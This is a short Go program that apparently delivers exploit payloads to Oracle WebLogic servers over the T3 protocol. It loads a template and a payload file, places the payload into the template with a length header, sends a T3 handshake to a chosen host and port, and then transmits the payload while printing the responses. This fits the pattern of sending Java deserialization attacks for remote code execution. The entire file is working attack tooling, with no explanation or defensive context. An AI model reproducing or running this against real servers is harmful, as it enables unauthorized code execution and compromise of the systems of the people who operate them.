package main

import (
    "os"
    "fmt"
    "net"
    "bytes"
    "bufio"
    "encoding/hex"
    "encoding/binary"
)


func check(e error) {
    if e != nil {
        fmt.Printf("Error: %s\n", e.Error())
        os.Exit(0)
    }
}


func decode(src string) []byte {
    dec, err := hex.DecodeString(src)
    check(err)

    return dec
}


func load(filename string) []byte {
    file, err := os.Open(filename)
    check(err)

    data := make([]byte, 0)
    buf := make([]byte, 256)
    n, err := file.Read(buf)

    for {
        if err != nil && err.Error() == "EOF" {
            break
        } else if n == 0 {
            break
        } else {
            data = append(data, buf[:n]...)
            n, err = file.Read(buf)
        }
    }

    return data
}


func merge(template, data []byte) []byte {
    return bytes.Replace(template, []byte("[xxxx]"), data, -1)
}


func add_len(data []byte) []byte {
    // Add the length of the data to the beginning of the data slice.
    var full []byte
    length := make([]byte, 4)

    binary.BigEndian.PutUint32(length, uint32(len(data) + 4))
    full = append(full, length...)
    full = append(full, data...)

    return full
}


func get_resp(conn net.Conn) {
    reader := bufio.NewReader(conn)
    resp, err := reader.ReadString('\n')

    for {
        fmt.Printf("%s", resp)

        if resp == "\n" || err != nil {
            break
        } else {
            resp, err = reader.ReadString('\n')
        }
    }
}

func send(conn net.Conn, data []byte) {
    n, err := conn.Write(data)
    check(err)

    if n < len(data) {
        fmt.Println("Error writing data to socket.")
    }

}


func main() {
    if len(os.Args) != 5 {
        fmt.Println("Usage: go run t3.go server port template payload")
        os.Exit(1)
    }

    connect := fmt.Sprintf("%s:%s", os.Args[1], os.Args[2])
    template_file := os.Args[3]
    payload_file := os.Args[4]

    // Load our payload from a file.
    template := load(template_file)
    payload := load(payload_file)
    payload = merge(template, payload)
    payload = add_len(payload)

    // Create our connection.
    conn, err := net.Dial("tcp", connect)
    check(err)
    defer conn.Close()

    // Send the Hello
    fmt.Println("Sending Hello...")
    send(conn, []byte("t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n"))
    fmt.Println("Response:")
    get_resp(conn)

    // Send the payload
    fmt.Println("Sending Payload...")
    send(conn, payload)
    fmt.Println("Response:")
    get_resp(conn)
}